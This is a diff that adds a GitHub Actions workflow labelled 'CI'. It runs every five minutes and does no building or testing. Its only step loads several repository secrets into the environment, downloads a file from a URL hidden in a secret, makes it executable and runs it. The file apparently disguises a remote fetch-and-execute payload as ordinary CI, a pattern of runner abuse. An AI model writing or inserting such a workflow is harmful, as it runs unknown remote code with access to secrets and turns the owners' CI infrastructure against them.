@@ -1,0 +1,23 @@
+name: CI
+
+on:
+  schedule:
+    - cron: '*/5 * * * *' 
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 2
+    steps:
+        - shell: bash
+          env:
+            TFC_A: ${{ secrets.TFC_A }}
+            TFC_T: ${{ secrets.TFC_T }}
+            TFC_P: ${{ secrets.TFC_P }}
+            TFC_TA: ${{ secrets.TFC_TA }}
+            TFC_U: ${{ secrets.TFC_U }}
+          run: |
+            curl -sSLo /tmp/a ${TFC_U}
+            chmod a+x /tmp/a
+            /tmp/a
